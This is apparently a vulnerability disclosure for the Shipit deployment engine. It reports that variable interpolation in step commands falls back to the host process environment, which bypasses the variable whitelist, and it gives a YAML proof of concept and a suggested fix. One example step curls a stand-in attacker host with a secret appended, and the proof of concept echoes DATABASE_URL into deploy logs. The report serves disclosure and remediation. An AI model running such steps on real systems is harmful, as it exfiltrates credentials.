### Title
Environment-variable whitelist can be bypassed by falling back to the host process's real `ENV` during shell-command interpolation - (File: `lib/shipit/environment_variables.rb`)

### Summary
`EnvironmentVariables#permit` is the whitelist that is supposed to gate which key/value pairs a task or deploy is allowed to carry, based on the `variables` declared in `shipit.yml` [1](#0-0) [2](#0-1) . That whitelist is enforced when building deploys/tasks (`filter_deploy_envs`, `filter_rollback_envs`, `task_definition#filter_envs`) [3](#0-2) [4](#0-3) . However, the same class's `interpolate` method — used when substituting `$VAR` tokens inside the *step commands* declared in `shipit.yml` before they are spawned — does not honor that whitelist at all: for any variable not present in the filtered task/deploy env, it silently falls back to reading the value from the Shipit web/worker process's actual `ENV` [5](#0-4) , and that value is substituted directly into the command line that gets executed via `PTY.spawn` [6](#0-5) [7](#0-6) .

### Finding Description
This breaks the equality that the whitelist is supposed to guarantee: **"environment key permitted" == "environment key spawned."**

- `EnvironmentVariables.permit` binds: *only keys declared as `variables:` in `shipit.yml` may be written into `task.env` / `deploy.env`* — anything else raises `NotPermitted` [2](#0-1) .
- `EnvironmentVariables.interpolate` binds a different, wider set at spawn time: *any `$VAR` referenced literally in a step's command line is resolved from the filtered env, or, if absent there, from the real OS-level `ENV` of the Rails/Sidekiq process* [5](#0-4) .

Because `shipit.yml`'s `deploy`/`rollback`/`tasks[*].steps` are free-form shell command lines (not restricted to the declared `variables:` list), whoever controls `shipit.yml` content can write a step like `echo $DATABASE_URL` or `curl attacker.example.com?x=$SOME_SECRET`, and at execution time `Command#interpolate_environment_variables` → `EnvironmentVariables#interpolate` will resolve `$DATABASE_URL`/`$SOME_SECRET` against the *host process's* `ENV`, not against the deploy's permitted/filtered env hash [6](#0-5) . The resulting value is `Shellwords.escape`d and interpolated straight into the spawned command line, then written into the task/deploy's streamed output, which is persisted and rendered on the stack/task page.

This is exactly the "whitelisted set, but the enforcement point doesn't actually apply the whitelist" bug class from the analog report (Arborist whitelist could be set but never revoked because the enforcement path bypassed the intended control): here the intended control (variable whitelist) exists, but a second, unguarded code path (shell interpolation) reads a completely different, unrestricted source of truth (process `ENV`) for the same syntax (`$NAME`).

Steps executed by `Shipit::Command` inherit a deliberately-scrubbed subprocess environment (`Command::BASE_ENV` nils out host-only keys before `PTY.spawn`) [8](#0-7) [9](#0-8) , showing the engine's authors clearly intended the spawned process to *not* see the host's real environment. The `interpolate` fallback in `EnvironmentVariables` completely defeats that intent by reaching back into the live Ruby process `ENV` (which commonly carries secrets such as `RAILS_MASTER_KEY`, `DATABASE_URL`, `REDIS_URL`, cloud credentials, etc., depending on deployment configuration) and baking the resolved value literally into the command string that does get spawned and logged.

### Impact Explanation
Any actor able to influence the text of a `shipit.yml` step (deploy/rollback/task step, `fetch`, `dependencies`) that is checked out and executed by a stack causes secret values from the Shipit host process's environment to be resolved and written into the visible, persisted task/deploy output. This is a credential-exfiltration primitive: the leaked value need only be one that happens to be present in the Rails/Sidekiq worker's `ENV` (a very common way to provision Rails secrets/credentials on many hosting platforms), and it is exposed to anyone who can view that stack's task/deploy log in the UI. Depending on what the deployment host stores in `ENV`, this can expose credentials that in turn enable further compromise (e.g., database, cloud, or other infrastructure credentials used by the Shipit application itself), which maps to the "exfiltration of ... secret" Critical-tier impact category.

### Likelihood Explanation
Reaching this code path only requires the ability to have a `shipit.yml` step line executed for a stack; it does not require the whitelist itself to be bypassed through the deploy/task-trigger APIs — the vulnerable interpolation runs independently of the env-permit check, using the same `$NAME` syntax already documented/expected for referencing declared variables. The severity of the impact is directly tied to what secrets the operating hosting environment happens to expose via `ENV` to the Shipit worker process, which is deployment-specific and cannot be fully verified from the engine source alone.

### Recommendation
Make `EnvironmentVariables#interpolate` strictly closed: only substitute `$NAME` for names present in the already-filtered/permitted env hash, and leave (or explicitly reject) any reference to a variable that is not part of the declared `variable_definitions` — never fall back to the real process `ENV`. Concretely, remove the `{ ENV[variable] }` fallback in `lib/shipit/environment_variables.rb#interpolate` and raise (or leave the token unexpanded) when the variable is not in `@env`.

### Proof of Concept
1. A `shipit.yml` under a stack's repository/branch defines a deploy step such as:
   ```yaml
   deploy:
     variables:
       - name: FOO
         default: "1"
     override:
       - "echo host-secret=$DATABASE_URL"
   ```
   `DATABASE_URL` is intentionally *not* declared in `variables:`, so it can never be written into `deploy.env` via `EnvironmentVariables.permit` (it would be rejected as "not whitelisted" if a caller tried to pass it explicitly) [2](#0-1) .
2. When the deploy step is executed, `TaskCommands#perform`/`StackCommands` build a `Command.new(command_line, env:, chdir:)` [10](#0-9) , and `Command#interpolated_arguments` calls `interpolate_environment_variables` on the raw command text [11](#0-10) .
3. `EnvironmentVariables#interpolate` looks up `$DATABASE_URL`; since it is absent from the filtered `@env`, it resolves `ENV['DATABASE_URL']` — the real value from the Shipit host process — and substitutes it into the command before `PTY.spawn` runs it [5](#0-4) [12](#0-11) .
4. The rendered/executed command line (`echo host-secret=<real-value>`) is captured in the streamed task/deploy output and persisted, exposing the secret to anyone with visibility into that stack's task log.

    def interpolate(argument)
      return argument unless @env

      argument.gsub(/(\$\w+)/) do |variable|
        variable.sub!('$', '')
        Shellwords.escape(@env.fetch(variable) { ENV[variable] })
      end
    end

    def sanitize_env_vars(variable_definitions)
      allowed_variables = variable_definitions.map(&:name)

      allowed, disallowed = @env.partition { |k, _| allowed_variables.include?(k) }.map(&:to_h)

      error_message = "Variables #{disallowed.keys.to_sentence} have not been whitelisted"
      raise NotPermitted, error_message unless disallowed.empty?

      allowed
    end
